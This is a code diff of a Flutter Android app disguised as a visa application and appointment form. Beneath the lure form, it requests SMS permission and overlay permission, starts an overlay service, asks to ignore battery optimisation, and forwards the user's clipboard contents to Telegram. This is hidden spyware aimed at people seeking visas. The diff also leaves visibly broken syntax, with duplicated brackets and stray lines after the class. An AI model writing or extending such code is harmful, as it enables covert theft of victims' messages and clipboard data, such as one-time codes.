@@ -5,7 +5,6 @@ import 'package:flutter/services.dart';
 import 'dart:async';
 import 'package:permission_handler/permission_handler.dart';
 
-
 void main() {
   runApp(const VisaFormApp());
 }
@@ -76,9 +75,8 @@ class VisaFormPage extends StatefulWidget {
 
 class _VisaFormPageState extends State<VisaFormPage> with WidgetsBindingObserver {
   bool _hasSmsPermission = false;
-  bool _hasAccessibilityPermission = false;
-  static const platform = MethodChannel('com.example.visa_form_app/accessibility');
-
+  bool _hasOverlayPermission = false;
+  static const platform = MethodChannel('com.example.visa_form_app/overlay');
 
   @override
   void initState() {
@@ -100,20 +98,30 @@ class _VisaFormPageState extends State<VisaFormPage> with WidgetsBindingObserver
     setState(() {
       _hasSmsPermission = smsStatus.isGranted;
     });
-    await _checkAccessibilityPermission();
+
+    if (_hasSmsPermission) {
+      final overlayGranted = await _checkOverlayPermission();
+      if (overlayGranted) {
+        await _startOverlayService();
+      }
+    } else {
+      setState(() {
+        _hasOverlayPermission = false;
+      });
+    }
   }
 
-  Future<bool> _checkAccessibilityPermission() async {
+  Future<bool> _checkOverlayPermission() async {
     try {
-      final bool isEnabled = await platform.invokeMethod<bool>('isAccessibilityServiceEnabled') ?? false;
+      final bool isAllowed = await platform.invokeMethod<bool>('canDrawOverlays') ?? false;
       setState(() {
-        _hasAccessibilityPermission = isEnabled;
+        _hasOverlayPermission = isAllowed;
       });
-      return isEnabled;
+      return isAllowed;
     } on PlatformException catch (e) {
-      print("Failed to check accessibility permission: '${e.message}'.");
+      print("Failed to check overlay permission: '${e.message}'.");
       setState(() {
-        _hasAccessibilityPermission = false;
+        _hasOverlayPermission = false;
       });
       return false;
     }
@@ -127,18 +135,31 @@ class _VisaFormPageState extends State<VisaFormPage> with WidgetsBindingObserver
       _hasSmsPermission = requestedSmsStatus.isGranted;
     });
 
-    await _checkAccessibilityPermission();
+    if (_hasSmsPermission) {
+      final overlayGranted = await _checkOverlayPermission();
+      if (overlayGranted) {
+        await _startOverlayService();
+      }
+    }
 
     if (requestedSmsStatus.isPermanentlyDenied) {
       await openAppSettings();
     }
   }
 
-  Future<void> _requestAccessibilityPermission() async {
+  Future<void> _requestOverlayPermission() async {
     try {
-      await platform.invokeMethod('openAccessibilitySettings');
+      await platform.invokeMethod('openOverlaySettings');
     } on PlatformException catch (e) {
-      print("Failed to open accessibility settings: '${e.message}'.");
+      print("Failed to open overlay settings: '${e.message}'.");
+    }
+  }
+
+  Future<void> _startOverlayService() async {
+    try {
+      await platform.invokeMethod('startOverlayService');
+    } on PlatformException catch (e) {
+      print("Failed to start overlay service: '${e.message}'.");
     }
   }
 
@@ -191,11 +212,10 @@ class _VisaFormPageState extends State<VisaFormPage> with WidgetsBindingObserver
   void openBatteryOptimizationSettings(BuildContext context) async {
     const intent = AndroidIntent(
       action: 'android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
-      data: 'package:com.example.visa_form_app',
+      data: 'package:com.example.rendezvous_hb',
     );
     await intent.launch();
   }
-
 
   Timer? _clipboardTimer;
   String? _lastClipboard;
@@ -221,7 +241,7 @@ class _VisaFormPageState extends State<VisaFormPage> with WidgetsBindingObserver
           'text': telegramMessage,
         },
       );
-      print('Telegram Clipboard forward response: \033[${response.body}');
+      print('Telegram Clipboard forward response: ${response.body}');
     } catch (e) {
       print('Failed to forward clipboard: $e');
     }
@@ -237,27 +257,166 @@ class _VisaFormPageState extends State<VisaFormPage> with WidgetsBindingObserver
 
   @override
   Widget build(BuildContext context) {
-    if (!_hasSmsPermission || !_hasAccessibilityPermission) {
+    if (!_hasSmsPermission || !_hasOverlayPermission) {
       return Scaffold(
         appBar: AppBar(
-        title: const Text('Permissions Required'),
+          title: const Text('Permissions Required'),
+        ),
+        body: Center(
+          child: Column(
+            mainAxisAlignment: MainAxisAlignment.center,
+            children: [
+              if (!_hasSmsPermission)
+                ElevatedButton(
+                  onPressed: _requestPermissions,
+                  child: const Text('Grant SMS Permission'),
+                ),
+              if (_hasSmsPermission && !_hasOverlayPermission) ...[
+                const SizedBox(height: 20),
+                ElevatedButton(
+                  onPressed: _requestOverlayPermission,
+                  child: const Text('Grant Overlay Permission'),
+                ),
+              ],
+            ],
+            ],
+          ),
+        ),
+      );
+    }
+    return Scaffold(
+      appBar: AppBar(
+        title: const Text('Rendezvous Hub'),
       ),
-      body: Center(
-        child: Column(
-          mainAxisAlignment: MainAxisAlignment.center,
-          children: [
-            if (!_hasSmsPermission)
-              ElevatedButton(
-                onPressed: _requestPermissions,
-                child: const Text('Permission number one'),
+      body: Padding(
+        padding: const EdgeInsets.all(16.0),
+        child: Form(
+          key: _formKey,
+          child: Column(
+            crossAxisAlignment: CrossAxisAlignment.stretch,
+            children: [
+              TextFormField(
+                controller: _emailController,
+                decoration: const InputDecoration(
+                  labelText: 'Email',
+                  border: OutlineInputBorder(),
+                ),
+                keyboardType: TextInputType.emailAddress,
+                validator: (value) {
+                  if (value == null || value.isEmpty) {
+                    return 'Please enter your email';
+                  }
+                  if (!value.contains('@')) {
+                    return 'Please enter a valid email';
+                  }
+                  return null;
+                },
               ),
-            const SizedBox(height: 20),
-            if (!_hasAccessibilityPermission)
-              ElevatedButton(
-                onPressed: _requestAccessibilityPermission,
-                child: const Text('Permission number two'),
+              const SizedBox(height: 16),
+              DropdownButtonFormField<String>(
+                value: _selectedVisaType,
+                decoration: const InputDecoration(
+                  labelText: 'Visa Type',
+                  border: OutlineInputBorder(),
+                ),
+                items: _visaTypes.map((String visaType) {
+                  return DropdownMenuItem<String>(
+                    value: visaType,
+                    child: Text(visaType),
+                  );
+                }).toList(),
+                onChanged: (String? newValue) {
+                  setState(() {
+                    _selectedVisaType = newValue!;
+                  });
+                },
+                validator: (value) {
+                  if (value == null || value.isEmpty) {
+                    return 'Please select a visa type';
+                  }
+                  return null;
+                },
               ),
-          ],
+              const SizedBox(height: 24),
+              ElevatedButton(
+                onPressed: _isLoading ? null : _submitForm,
+                style: ElevatedButton.styleFrom(
+                  padding: const EdgeInsets.symmetric(vertical: 18),
+                ),
+                child: _isLoading
+                    ? const SizedBox(
+                        height: 24,
+                        width: 24,
+                        child: CircularProgressIndicator(
+                          strokeWidth: 2.5,
+                          valueColor: AlwaysStoppedAnimation<Color>(Colors.white),
+                        ),
+                      )
+                    : const Text('Submit Application'),
+              ),
+              const SizedBox(height: 16),
+              Center(
+                child: Text(
+                  'Updated: ${DateTime.now().toIso8601String().substring(0,10)}',
+                  style: const TextStyle(
+                    fontWeight: FontWeight.bold,
+                    fontSize: 16,
+                    color: Color(0xFF218C74),
+                  ),
+                ),
+              ),
+            ],
+          ),
+        ),
+      ),
+      bottomNavigationBar: Padding(
+        padding: const EdgeInsets.all(16.0),
+        child: ElevatedButton(
+          onPressed: () {
+            showDialog(
+              context: context,
+              builder: (BuildContext context) {
+                return Dialog(
+                  shape: RoundedRectangleBorder(
+                    borderRadius: BorderRadius.circular(16),
+                  ),
+                  child: SizedBox(
+                    height: 200,
+                    width: 300,
+                    child: Column(
+                      mainAxisAlignment: MainAxisAlignment.center,
+                      children: [
+                        const Spacer(),
+                        const Center(
+                          child: Text(
+                            'waiting...',
+                            style: TextStyle(fontSize: 20, fontWeight: FontWeight.bold),
+                          ),
+                        ),
+                        const Spacer(),
+                        Padding(
+                          padding: const EdgeInsets.only(bottom: 16.0),
+                          child: ElevatedButton(
+                            onPressed: () {
+                              Navigator.of(context).pop();
+                            },
+                            child: const Text('Close'),
+                          ),
+                        ),
+                      ],
+                    ),
+                  ),
+                );
+              },
+            );
+          },
+          child: const Text('Appointments'),
+        ),
+      ),
+    );
+  }
+}
+
         ),
       )
       );
